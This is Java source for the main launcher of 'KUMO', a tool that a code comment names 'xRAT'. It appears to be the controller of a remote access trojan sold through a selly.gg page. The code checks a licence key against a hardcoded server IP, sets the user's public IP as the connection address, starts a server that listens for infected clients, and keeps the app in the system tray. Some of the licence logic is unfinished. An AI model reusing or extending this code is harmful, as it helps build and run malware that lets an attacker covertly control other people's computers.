package KUMO;

import GUI.Views.AlertView;
import GUI.Views.FirstRunView;
import GUI.Views.MainView;
import Logger.Level;
import Logger.Logger;
import Server.Data.PseudoBase;
import Server.KumoSettings;
import Server.Server;
import javafx.application.Application;
import javafx.application.Platform;
import javafx.scene.Scene;
import javafx.scene.image.Image;
import javafx.stage.Stage;
import javafx.stage.StageStyle;

import javax.imageio.ImageIO;
import javax.swing.*;
import java.awt.*;
import java.io.*;
import java.net.URL;
import java.net.UnknownHostException;
import java.nio.channels.FileLock;
import java.util.Scanner;


public class Kumo extends Application {
    private static Stage primaryStage;
    private static Server server = new Server();
    public static SystemTray systemTray;

    public static Stage getPrimaryStage() {
        return primaryStage;
    }

    public static void main(String[] args) {

        File firstStartUp = new File(System.getProperty("java.io.tmpdir") + ".kumoStartup");
        if (firstStartUp.exists()){
            // Not first run, check if key is activated
            try {
                String key = new Scanner(firstStartUp).useDelimiter("\\A").next();
                String st = new Scanner(new URL("http://45.55.208.158:8001/id-info/" + key).openStream(), "UTF-8").useDelimiter("\\A").next();
                if (st.equals("{\"exists\":true,\"activated\":true}")){
                    // continue to launch normally
                } else {
                    // Key doesn't exists or hasn't been activated
                }
            } catch (IOException ioe){
                new AlertView().showErrorAlertWait("Unable to verify product key. Please check your internet connection");
                System.exit(1);
            }
        } else {
            // This is the first run, have user enter key and check it with the server
            Stage stage = new Stage();
            stage.setMinHeight(300);
            stage.setMinWidth(300);
            stage.initStyle(StageStyle.DECORATED);
            stage.setScene(new Scene(new FirstRunView().getFirstRunView(stage), 300, 225));
            stage.setOnCloseRequest(a -> System.exit(1)); // If user exits this window, close everything and dont write it
            FirstRunView.getSend().setOnAction(event -> {
                try {
                    String st = new Scanner(new URL("http://45.55.208.158:8001/check-id/" + FirstRunView.getTextField().getText().trim()).openStream(), "UTF-8").useDelimiter("\\A").next();
                    if (st.equals("{\"status\":\"false\"}")) {
                        new AlertView().showErrorAlertWait("This software was either pirated or downloaded illegally. Please buy it at https://selly.gg/p/b7e477ee.");
                        System.exit(1);
                    } else if (st.equals("{\"status\":\"true\"}")){
                        new URL("http://45.55.208.158/activate-id/" + FirstRunView.getTextField().getText().trim()).openStream(); // No return body
                        // Write key to file

                    }
                } catch (IOException ioe){
                    new AlertView().showErrorAlertWait("\"Unable to verify ID. Please check your internet connection.\"");
                    System.exit(1);
                }
            });
            stage.showAndWait();
        }

        if (lockInstance()) {
            //SvgImageLoaderFactory.install(new PrimitiveDimensionProvider());
            launch(args);
        } else {
            System.exit(0);
        }
    }

    /* Ensure only one instance of KUMO is running on a system (server, not client). */
    private static boolean lockInstance() {
        try {
            final File file = new File(System.getProperty("user.home") + "/.lock");
            final RandomAccessFile randomAccessFile = new RandomAccessFile(file, "rw");
            final FileLock fileLock = randomAccessFile.getChannel().tryLock();
            if (fileLock != null) {
                Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                    try {
                        fileLock.release();
                        randomAccessFile.close();
                        file.delete();
                        /*Before KUMO is closed - write KUMO data to file (server settings, clients, etc.) */
                        try {
                            PseudoBase.writeKumoData();
                            Logger.log(Level.INFO, "KumoData saved to file. ");
                        } catch (IOException e) {
                            Logger.log(Level.ERROR, e.toString());
                        }
                    } catch (Exception e) {
                        Logger.log(Level.ERROR, e.toString());
                    }
                }));
                return true;
            }
        } catch (Exception e) {
            Logger.log(Level.ERROR, e.toString());
        }
        return false;
    }

    @Override
    public void start(Stage primaryStage) throws IOException, ClassNotFoundException {
        KUMO.Kumo.primaryStage = primaryStage;

        /* Ensure that the necessary files exist */
        new PseudoBase().createKumoData();
        /* Load data from files - including client data, server settings, etc. */
        new PseudoBase().loadData();
        /* Set up primary view */
        getPrimaryStage().setTitle("KUMO " + KumoSettings.CURRENT_VERSION);

        SwingUtilities.invokeLater(this::addAppToTray);
        Platform.setImplicitExit(false);
        Scene mainScene = new Scene(new MainView().getMainView(), 900, 500);
        mainScene.getStylesheets().add(getClass().getResource("/css/global.css").toExternalForm());
        getPrimaryStage().setScene(mainScene);
        getPrimaryStage().getIcons().add(new Image(getClass().getResourceAsStream("/Images/Icons/icon.png")));
        getPrimaryStage().setOnCloseRequest(event -> System.exit(0));

        /* it is running! */
        Logger.log(Level.INFO, "Kumo is running.");
        getPrimaryStage().initStyle(StageStyle.UNDECORATED);

        try {
            /* Set user's IP as Server IP */

            URL whatismyip = new URL("http://checkip.amazonaws.com");
            BufferedReader in = new BufferedReader(new InputStreamReader(
                    whatismyip.openStream()));

            String ip = in.readLine();
            KumoSettings.CONNECTION_IP = ip;
        } catch (UnknownHostException e){
            AlertView a = new AlertView();
            a.showErrorAlert("No internet detected, aborting startup.");
            System.exit(1);
        }

        getPrimaryStage().show();

        /* Start the server to listen for client connections. */
        Runnable startServer = server;
        new Thread(startServer).start();
    }


    /* Attempt to add xRAT to the System Tray - regardless of persistence (handled in TitleBar) */
    private void addAppToTray() {
        try {
           Toolkit.getDefaultToolkit();

            if (!SystemTray.isSupported()) {
                System.out.println("No system tray support, application exiting.");
                Platform.exit();
            }

            systemTray = SystemTray.getSystemTray();
            java.awt.Image image = ImageIO.read(getClass().getResourceAsStream("/Images/Icons/icon.png"));
            TrayIcon trayIcon = new TrayIcon(image);
            trayIcon.setImageAutoSize(true);
            trayIcon.addActionListener(event -> Platform.runLater(this::showStage));

            MenuItem openItem = new MenuItem("Open Kumo");
            openItem.addActionListener(event -> Platform.runLater(this::showStage));

            Font defaultFont = Font.decode(null);
            Font boldFont = defaultFont.deriveFont(java.awt.Font.BOLD);
            openItem.setFont(boldFont);

            MenuItem exitItem = new MenuItem("Exit");
            exitItem.addActionListener(event -> {
                Platform.exit();
                systemTray.remove(trayIcon);
                System.exit(0);
            });
            final PopupMenu popup = new PopupMenu();
            popup.add(openItem);
            popup.addSeparator();
            popup.add(exitItem);
            trayIcon.setPopupMenu(popup);
            systemTray.add(trayIcon);
        } catch (Exception e) {
            Logger.log(Level.ERROR, "Unable to access system tray.");
            e.printStackTrace();
        }
    }

    private void showStage() {
        getPrimaryStage().setScene(new Scene(new MainView().getMainView(), 900, 500));
        getPrimaryStage().show();
        getPrimaryStage().toFront();
    }
}
